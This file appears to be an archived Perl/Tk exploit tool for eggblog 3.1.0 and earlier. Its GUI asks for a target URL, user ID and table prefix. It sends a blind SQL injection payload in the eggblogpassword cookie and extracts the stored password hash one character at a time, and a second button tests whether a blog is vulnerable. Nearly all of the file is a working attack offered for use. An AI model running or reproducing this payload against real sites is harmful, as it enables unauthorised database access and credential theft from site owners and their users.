#!/usr/bin/perl

	use Tk;
	use Tk::BrowseEntry;
	use Tk::DialogBox;
	use LWP::UserAgent;

	$mw = new MainWindow(title => "UnderWHAT?!" );

	$mw->geometry ( '420x343' ) ;
	$mw->resizable(0,0);

	$mw->Label(-text => '', -font => '{Verdana} 8',-foreground=>'red')->pack();
	$mw->Label(-text => 'eggblog <= 3.1.0 Cookies Sql Injection', -font => '{Tahoma} 7 bold',-foreground=>'red')->pack();
	$mw->Label(-text => 'it will take about half an hour to get hashed password', -font => '{Tahoma} 7 bold',-foreground=>'red')->pack();
	$mw->Label(-text => 'you need magic_quotes_gpc turned off and mysql version higher that 4.1', -font => '{Tahoma} 7 bold',-foreground=>'red')->pack();
	$mw->Label(-text => '', -font => '{Tahoma} 7 bold',-foreground=>'red')->pack();


	$fleft  = $mw->Frame()->pack ( -side => 'left', -anchor => 'ne') ;
	$fright = $mw->Frame()->pack ( -side => 'left', -anchor => 'nw') ;

	$url      = 'http://test2.ru/eggblog/home/index.php';
	$user_id  = '1';
	$prefix   = 'eggblog_';
	$table    = 'users';
	$column   = 'user_password';
	$report   = '';
	$group    = 1;
	$curr_user = 0;
	


	$fleft->Label ( -text => 'Path to forum index: ', -font => '{Verdana} 8 bold') ->pack ( -side => "top" , -anchor => 'e' ) ;
	$fright->Entry ( -relief => "groove", -width => 35, -font => '{Verdana} 8', -textvariable => \$url) ->pack ( -side => "top" , -anchor => 'w' ) ;

	$fleft->Label ( -text => 'User ID: ', -font => '{Verdana} 8 bold' ) ->pack ( -side => "top" , -anchor => 'e' ) ;
	$fright->Entry ( -relief => "groove", -width => 35, -font => '{Verdana} 8', -textvariable => \$user_id) ->pack ( -side => "top" , -anchor => 'w' ) ;

	$fleft->Label ( -text => 'Database tables prefix: ', -font => '{Verdana} 8 bold') ->pack ( -side => "top" , -anchor => 'e' ) ;
	$fright->Entry ( -relief => "groove", -width => 35, -font => '{Verdana} 8', -textvariable => \$prefix) ->pack ( -side => "top" , -anchor => 'w' ) ;

	$fleft->Label ( -text => 'Returned hash: ', -font => '{Verdana} 8 bold') ->pack ( -side => "top" , -anchor => 'e' ) ;
	$fright->Entry ( -relief => "groove", -width => 35, -font => '{Verdana} 8', -textvariable => \$report) ->pack ( -side => "top" , -anchor => 'w' ) ;

	$fright->Label( -text => ' ')->pack();

	$fright->Button(-text    => 'Test blog vulnerability',
	                -relief => "groove",
	                -width => '30',
	                -font => '{Verdana} 8 bold',
	                -activeforeground => 'red',
	                -command => \&test_vuln
	               )->pack();
	
	$fright->Button(-text    => 'Get hash from database',
	                -relief => "groove",
	                -width => '30',
	                -font => '{Verdana} 8 bold',
	                -activeforeground => 'red',
	                -command => \&get_hash
	               )->pack();
				   
				   
	$mw   ->Label(-text => '', -font => '{Verdana} 7 bold',-foreground=>'red')->pack();
	$fleft->Label(-text => '!', -font => '{Webdings} 22')->pack();
	$fleft->Label(-text => 'eggblog 3.1.0', -font => '{Verdana} 7 bold',-foreground=>'red')->pack();
	$fleft->Label(-text => 'cookie sql injection ', -font => '{Verdana} 7 bold',-foreground=>'red')->pack();
	$fleft->Label(-text => 'mysql char bruteforcing ', -font => '{Verdana} 7 bold',-foreground=>'red')->pack();
	$fleft->Label(-text => 'bug in auth function ', -font => '{Verdana} 7 bold',-foreground=>'red')->pack();
	$fleft->Label(-text => 'by gemaglabin and Elekt  ', -font => '{Verdana} 7 bold',-foreground=>'red')->pack();
	$fleft->Label(-text => '( mafia of antichat.ru ) ', -font => '{Verdana} 7 bold',-foreground=>'red')->pack();
	$fleft->Label(-text => ' 2007.02.04 ( fixed ) ', -font => '{Verdana} 7 bold',-foreground=>'red')->pack();
	$fright->Label(-text => '', -font => '{Verdana} 3 bold',-foreground=>'red')->pack();
	$print=$fright->Text(-width=>35,-height=>5,-wrap=>"word")->pack(-side=>"top",-anchor=>"s");
	
	MainLoop();
	
	sub get_hash()
	{
		srand();
		$xpl = LWP::UserAgent->new( ) or die;
		$InfoWindow=$mw->DialogBox(-title   => 'get hash from database', -buttons => ["OK"]);
		$i = 1;
		$b = 0;
		$report = '';
		my ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) = localtime(time);
		$print->insert('end',"- Start [$hour:$min:$sec]\n");
		my @brutearray=qw(48 49 50 51 52 53 54 55 56 57 58 97 98 99 100 101 102);
		while (length($report)<32)
		{
			$num = $brutearray[$b];
			$ret = get_pchar();
			if($ret > 0)
			{
				$print->insert('end',"- char [$num] = ".chr($num)."\n");
				$report .= chr($num);
				$b = 0;
				$i = $i +1;
				$mw->update(); 
				break;
			}
			else
			{
				$b = $b +1;
			}
		}
		my ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) = localtime(time);
		$print->insert('end',"- Finish [$hour:$min:$sec]");
	}
		
	sub get_pchar()
	{
		$res = $xpl->get($url,'Cookie'=>"eggblogemail=%;eggblogpassword=' or 1=if(ascii(substring((select password from ".$prefix."members where id=$user_id),$i,1))=$num,1,(select 1 union select 2))/*");
		if($res->as_string =~ /MySQL/i) { return 0;}
		else {return 1;}
	}
		 
	sub test_vuln()
	{
		$xpl = LWP::UserAgent->new( ) or die;
		$res = $xpl->get($url,'Cookie'=>"eggblogemail=%;eggblogpassword='");
		if($res->is_success) 
		{
			$rep = '';
			if($res->as_string =~ /MySQL/i) 
			{ 
				$print->insert('end',"- BLOG VULNERABLE\n");
			}
			else { $print->insert('end',"- BLOG UNVULNERABLE\n");} 
		}
	}

# milw0rm.com [2008-01-07]
